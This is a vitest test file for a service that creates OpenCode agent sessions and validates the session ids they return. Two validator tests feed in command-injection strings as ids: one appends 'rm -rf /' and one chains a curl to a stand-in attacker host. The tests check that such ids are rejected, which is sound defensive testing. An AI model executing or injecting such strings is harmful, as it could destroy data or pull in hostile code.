import { describe, expect, it } from 'vitest'
import {
  isOpenCodeSessionId,
  type OpenCodeApiRequest,
  parseSessionId,
  startOpenCodeSession,
} from '../src/services/opencode-session.js'

const NO_SESSION_ID_PATTERN = /no usable session id/u
const NO_JSON_BODY_PATTERN = /no JSON body/u

const sessionResponse = (id: string): string =>
  `${JSON.stringify({ data: { id, projectID: 'global' } })}\n`

const recordingRunner = (responses: readonly string[]) => {
  const requests: OpenCodeApiRequest[] = []
  let call = 0
  const runApi = (request: OpenCodeApiRequest): Promise<string> => {
    requests.push(request)
    const response = responses[call] ?? ''
    call += 1
    return Promise.resolve(response)
  }
  return { requests, runApi }
}

describe('startOpenCodeSession', () => {
  it('creates a session in the worktree and posts the prompt to it', async () => {
    const { requests, runApi } = recordingRunner([
      sessionResponse('ses_006bb764affeIlL3Pp2gLYz4nE'),
      '{"data":{"id":"msg_1"}}',
    ])

    const sessionId = await startOpenCodeSession({
      agentCommand: 'opencode2',
      directory: '/worktrees/fix-auth',
      prompt: 'Fix the auth flow.\n\nIt drops the session on refresh.',
      runApi,
    })

    expect(sessionId).toBe('ses_006bb764affeIlL3Pp2gLYz4nE')
    expect(requests).toEqual([
      {
        body: { location: { directory: '/worktrees/fix-auth' } },
        cwd: '/worktrees/fix-auth',
        path: '/api/session',
      },
      {
        body: {
          text: 'Fix the auth flow.\n\nIt drops the session on refresh.',
        },
        cwd: '/worktrees/fix-auth',
        path: '/api/session/ses_006bb764affeIlL3Pp2gLYz4nE/prompt',
      },
    ])
  })

  it('leaves the agent and model to the server so project defaults win', async () => {
    const { requests, runApi } = recordingRunner([
      sessionResponse('ses_abc123'),
      '{"data":{}}',
    ])

    await startOpenCodeSession({
      agentCommand: 'opencode2',
      directory: '/worktrees/fix-auth',
      prompt: 'Investigate the Slack report.',
      runApi,
    })

    expect(requests[0]?.body).toEqual({
      location: { directory: '/worktrees/fix-auth' },
    })
  })

  it('does not send the prompt when the session response is unusable', async () => {
    const { requests, runApi } = recordingRunner(['{"data":{}}'])

    await expect(
      startOpenCodeSession({
        agentCommand: 'opencode2',
        directory: '/worktrees/fix-auth',
        prompt: 'Investigate the Slack report.',
        runApi,
      })
    ).rejects.toThrow(NO_SESSION_ID_PATTERN)

    expect(requests).toHaveLength(1)
  })

  it('surfaces a failing API call to the caller', async () => {
    const runApi = (): Promise<string> =>
      Promise.reject(new Error('connection refused'))

    await expect(
      startOpenCodeSession({
        agentCommand: 'opencode2',
        directory: '/worktrees/fix-auth',
        prompt: 'Investigate the Slack report.',
        runApi,
      })
    ).rejects.toThrow('connection refused')
  })
})

describe('parseSessionId', () => {
  it('reads the id out of the CLI response envelope', () => {
    expect(parseSessionId(sessionResponse('ses_abc123'))).toBe('ses_abc123')
  })

  it('rejects a response whose id could not have come from OpenCode', () => {
    expect(() => parseSessionId('{"data":{"id":"ses_abc; rm -rf /"}}')).toThrow(
      NO_SESSION_ID_PATTERN
    )
  })

  it('rejects output that carries no JSON body at all', () => {
    expect(() => parseSessionId('command not found: opencode2\n')).toThrow(
      NO_JSON_BODY_PATTERN
    )
  })
})

describe('isOpenCodeSessionId', () => {
  it('accepts real session ids and rejects shell-unsafe text', () => {
    expect(isOpenCodeSessionId('ses_006bb764affeIlL3Pp2gLYz4nE')).toBe(true)
    expect(isOpenCodeSessionId('ses_abc && curl evil.sh')).toBe(false)
    expect(isOpenCodeSessionId('msg_abc123')).toBe(false)
    expect(isOpenCodeSessionId('')).toBe(false)
  })
})
